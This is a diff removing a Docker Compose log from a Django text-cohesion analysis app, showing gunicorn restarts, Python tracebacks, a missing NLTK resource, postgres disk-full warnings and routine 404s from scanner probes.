@@ -1,879 +1,0 @@
-Attaching to cohvis_nginx_1, cohvis_web_1, cohvis_postgres_1
-[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m [2017-04-05 10:09:42 +0000] [1] [INFO] Handling signal: term
-[33mweb_1       |[0m [2017-04-05 12:09:42 +0000] [8] [INFO] Worker exiting (pid: 8)
-[33mweb_1       |[0m [2017-04-05 12:09:42 +0000] [10] [INFO] Worker exiting (pid: 10)
-[33mweb_1       |[0m [2017-04-05 10:09:42 +0000] [1] [INFO] Shutting down: Master
-[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m Internal Server Error: /apis/textanalyzer/
-[33mweb_1       |[0m Traceback (most recent call last):
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/exception.py", line 39, in inner
-[33mweb_1       |[0m     response = get_response(request)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 249, in _legacy_get_response
-[33mweb_1       |[0m     response = self._get_response(request)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 187, in _get_response
-[33mweb_1       |[0m     response = self.process_exception_by_middleware(e, request)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 185, in _get_response
-[33mweb_1       |[0m     response = wrapped_callback(request, *callback_args, **callback_kwargs)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/decorators/csrf.py", line 58, in wrapped_view
-[33mweb_1       |[0m     return view_func(*args, **kwargs)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/generic/base.py", line 68, in view
-[33mweb_1       |[0m     return self.dispatch(request, *args, **kwargs)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 483, in dispatch
-[33mweb_1       |[0m     response = self.handle_exception(exc)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 443, in handle_exception
-[33mweb_1       |[0m     self.raise_uncaught_exception(exc)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 480, in dispatch
-[33mweb_1       |[0m     response = handler(request, *args, **kwargs)
-[33mweb_1       |[0m   File "/code/cohapp/apis.py", line 470, in post
-[33mweb_1       |[0m     analyzer = analyzeTextCohesion(text)
-[33mweb_1       |[0m   File "/code/cohapp/coherenceanalyzer/coherenceanalyzer.py", line 606, in analyzeTextCohesion
-[33mweb_1       |[0m     f = open(constants.temp_text, 'w')
-[32mpostgres_1  |[0m The files belonging to this database system will be owned by user "postgres".
-[32mpostgres_1  |[0m This user must also own the server process.
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m The database cluster will be initialized with locale "en_US.utf8".
-[32mpostgres_1  |[0m The default database encoding has accordingly been set to "UTF8".
-[32mpostgres_1  |[0m The default text search configuration will be set to "english".
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m Data page checksums are disabled.
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m fixing permissions on existing directory /var/lib/postgresql/data ... ok
-[32mpostgres_1  |[0m creating subdirectories ... ok
-[32mpostgres_1  |[0m selecting default max_connections ... 100
-[32mpostgres_1  |[0m selecting default shared_buffers ... 128MB
-[32mpostgres_1  |[0m selecting dynamic shared memory implementation ... posix
-[32mpostgres_1  |[0m creating configuration files ... ok
-[32mpostgres_1  |[0m running bootstrap script ... ok
-[32mpostgres_1  |[0m performing post-bootstrap initialization ... ok
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m WARNING: enabling "trust" authentication for local connections
-[32mpostgres_1  |[0m You can change this by editing pg_hba.conf or using the option -A, or
-[32mpostgres_1  |[0m --auth-local and --auth-host, the next time you run initdb.
-[32mpostgres_1  |[0m syncing data to disk ... ok
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m Success. You can now start the database server using:
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m     pg_ctl -D /var/lib/postgresql/data -l logfile start
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m ****************************************************
-[32mpostgres_1  |[0m WARNING: No password has been set for the database.
-[32mpostgres_1  |[0m          This will allow anyone with access to the
-[32mpostgres_1  |[0m          Postgres port to access your database. In
-[32mpostgres_1  |[0m          Docker's default configuration, this is
-[32mpostgres_1  |[0m          effectively any other container on the same
-[32mpostgres_1  |[0m          system.
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m          Use "-e POSTGRES_PASSWORD=password" to set
-[32mpostgres_1  |[0m          it in "docker run".
-[32mpostgres_1  |[0m ****************************************************
-[32mpostgres_1  |[0m waiting for server to start....LOG:  database system was shut down at 2017-04-05 07:51:37 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m  done
-[32mpostgres_1  |[0m server started
-[32mpostgres_1  |[0m ALTER ROLE
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m /usr/local/bin/docker-entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m LOG:  received fast shutdown request
-[32mpostgres_1  |[0m LOG:  aborting any active transactions
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m waiting for server to shut down....LOG:  database system is shut down
-[32mpostgres_1  |[0m  done
-[32mpostgres_1  |[0m server stopped
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m PostgreSQL init process complete; ready for start up.
-[32mpostgres_1  |[0m 
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 07:51:39 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 07:52:45 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[33mweb_1       |[0m IOError: [Errno 2] No such file or directory: '/code/cohapp/coherenceanalyzer/temp/text'
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-05 10:11:34 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:10)
-[33mweb_1       |[0m [2017-04-05 12:11:34 +0000] [10] [INFO] Worker exiting (pid: 10)
-[33mweb_1       |[0m [2017-04-05 10:11:35 +0000] [31] [INFO] Booting worker with pid: 31
-[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_calendar.gif
-[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_clock.gif
-[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_clock.gif
-[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_calendar.gif
-[33mweb_1       |[0m Not Found: /favicon.ico
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m Not Found: /favicon.ico
-[33mweb_1       |[0m Not Found: /login-experiment/er4qba52shp5yn6skran8xnwjjs5h27bwxscd2pj
-[33mweb_1       |[0m Forbidden (CSRF token missing or incorrect.): /login-experiment/er4qba52shp5yn6skran8xnwjjs5h27bwxscd2pj
-[33mweb_1       |[0m Not Found: /favicon.ico
-[33mweb_1       |[0m Not Found: /missing-admin-media-prefix/img/icon_calendar.gif
-[33mweb_1       |[0m Not Found: /admin/cohapp/subject/1/delete/
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.baidu.com'. You may need to add u'www.baidu.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m [2017-04-05 16:42:53 +0000] [1] [INFO] Handling signal: term
-[33mweb_1       |[0m [2017-04-05 18:42:53 +0000] [8] [INFO] Worker exiting (pid: 8)
-[33mweb_1       |[0m [2017-04-05 18:42:53 +0000] [31] [INFO] Worker exiting (pid: 31)
-[33mweb_1       |[0m [2017-04-05 16:42:53 +0000] [1] [INFO] Shutting down: Master
-[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-05 16:46:37 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m [2017-04-05 17:27:30 +0000] [1] [INFO] Handling signal: term
-[33mweb_1       |[0m [2017-04-05 19:27:30 +0000] [8] [INFO] Worker exiting (pid: 8)
-[33mweb_1       |[0m [2017-04-05 19:27:30 +0000] [10] [INFO] Worker exiting (pid: 10)
-[33mweb_1       |[0m [2017-04-05 17:27:30 +0000] [1] [INFO] Shutting down: Master
-[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-05 17:33:36 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-05 17:39:14 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m Not Found: /favicon.ico
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-05 17:41:50 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:8)
-[33mweb_1       |[0m [2017-04-05 19:41:50 +0000] [8] [INFO] Worker exiting (pid: 8)
-[33mweb_1       |[0m [2017-04-05 17:41:51 +0000] [22] [INFO] Booting worker with pid: 22
-[33mweb_1       |[0m Not Found: /setup.cgi
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m [2017-04-05 18:46:39 +0000] [1] [INFO] Handling signal: term
-[33mweb_1       |[0m [2017-04-05 20:46:39 +0000] [10] [INFO] Worker exiting (pid: 10)
-[33mweb_1       |[0m [2017-04-05 20:46:39 +0000] [22] [INFO] Worker exiting (pid: 22)
-[33mweb_1       |[0m [2017-04-05 18:46:39 +0000] [1] [INFO] Shutting down: Master
-[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-05 18:47:27 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m Not Found: /setup.cgi
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m Not Found: /hndUnblock.cgi
-[33mweb_1       |[0m Not Found: /tmUnblock.cgi
-[33mweb_1       |[0m Not Found: /cgi
-[33mweb_1       |[0m Not Found: /cgi-bin/cgiSrv.cgi
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  using stale statistics instead of current ones because stats collector is not responding
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_12407.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat_tmp/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m FATAL:  terminating autovacuum process due to administrator command
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat/db_12407.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat/db_0.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  could not close temporary statistics file "pg_stat/global.tmp": No space left on device
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 08:55:53 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 09:06:36 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m Not Found: /setup.cgi
-[33mweb_1       |[0m Invalid HTTP_HOST header: 'www.bing.com'. You may need to add u'www.bing.com' to ALLOWED_HOSTS.
-[33mweb_1       |[0m Not Found: /favicon.ico
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m Internal Server Error: /apis/textanalyzer/
-[33mweb_1       |[0m Traceback (most recent call last):
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/exception.py", line 39, in inner
-[33mweb_1       |[0m     response = get_response(request)
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 09:33:37 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 09:58:50 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m FATAL:  role "christianb" does not exist
-[32mpostgres_1  |[0m ERROR:  relation "auth_user" does not exist at character 280
-[32mpostgres_1  |[0m STATEMENT:  SELECT "auth_user"."id", "auth_user"."password", "auth_user"."last_login", "auth_user"."is_superuser", "auth_user"."username", "auth_user"."first_name", "auth_user"."last_name", "auth_user"."email", "auth_user"."is_staff", "auth_user"."is_active", "auth_user"."date_joined" FROM "auth_user" WHERE "auth_user"."username" = 'root'
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 10:09:42 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 16:42:53 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 17:27:30 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-05 17:33:35 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  invalid record length at 0/15E9938: wanted 24, got 0
-[32mpostgres_1  |[0m LOG:  redo is not required
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  received smart shutdown request
-[32mpostgres_1  |[0m LOG:  autovacuum launcher shutting down
-[32mpostgres_1  |[0m LOG:  shutting down
-[32mpostgres_1  |[0m LOG:  database system is shut down
-[32mpostgres_1  |[0m LOG:  database system was shut down at 2017-04-05 18:46:40 UTC
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m FATAL:  database "template0" is not currently accepting connections
-[32mpostgres_1  |[0m FATAL:  database "-h" does not exist
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 27265.28208: server supports 1.0 to 3.0
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 249, in _legacy_get_response
-[33mweb_1       |[0m     response = self._get_response(request)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 187, in _get_response
-[33mweb_1       |[0m     response = self.process_exception_by_middleware(e, request)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 185, in _get_response
-[33mweb_1       |[0m     response = wrapped_callback(request, *callback_args, **callback_kwargs)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/decorators/csrf.py", line 58, in wrapped_view
-[33mweb_1       |[0m     return view_func(*args, **kwargs)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/generic/base.py", line 68, in view
-[33mweb_1       |[0m     return self.dispatch(request, *args, **kwargs)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 483, in dispatch
-[33mweb_1       |[0m     response = self.handle_exception(exc)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 443, in handle_exception
-[33mweb_1       |[0m     self.raise_uncaught_exception(exc)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 480, in dispatch
-[33mweb_1       |[0m     response = handler(request, *args, **kwargs)
-[33mweb_1       |[0m   File "/code/cohapp/apis.py", line 470, in post
-[33mweb_1       |[0m     analyzer = analyzeTextCohesion(text)
-[33mweb_1       |[0m   File "/code/cohapp/coherenceanalyzer/coherenceanalyzer.py", line 724, in analyzeTextCohesion
-[33mweb_1       |[0m     stem_relations = get_stem_relations(sentences, gn)
-[33mweb_1       |[0m   File "/code/cohapp/coherenceanalyzer/coherenceanalyzer.py", line 314, in get_stem_relations
-[33mweb_1       |[0m     stemmer = GermanStemmer(ignore_stopwords=True)
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/nltk/stem/snowball.py", line 120, in __init__
-[33mweb_1       |[0m     for word in stopwords.words(language):
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/nltk/corpus/util.py", line 116, in __getattr__
-[33mweb_1       |[0m     self.__load()
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/nltk/corpus/util.py", line 81, in __load
-[33mweb_1       |[0m     except LookupError: raise e
-[33mweb_1       |[0m LookupError: 
-[33mweb_1       |[0m **********************************************************************
-[33mweb_1       |[0m   Resource u'corpora/stopwords' not found.  Please use the NLTK
-[33mweb_1       |[0m   Downloader to obtain the resource:  >>> nltk.download()
-[33mweb_1       |[0m   Searched in:
-[33mweb_1       |[0m     - '/code/nltk_data'
-[33mweb_1       |[0m     - '/usr/share/nltk_data'
-[33mweb_1       |[0m     - '/usr/local/share/nltk_data'
-[33mweb_1       |[0m     - '/usr/lib/nltk_data'
-[33mweb_1       |[0m     - '/usr/local/lib/nltk_data'
-[33mweb_1       |[0m **********************************************************************
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [10] [INFO] Worker reloading: /code/cohapp/views.py modified
-[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [10] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
-[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [8] [INFO] Worker reloading: /code/cohapp/views.py modified
-[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [8] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
-[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [8] [INFO] Worker exiting (pid: 8)
-[33mweb_1       |[0m [2017-04-06 10:04:44 +0000] [10] [INFO] Worker exiting (pid: 10)
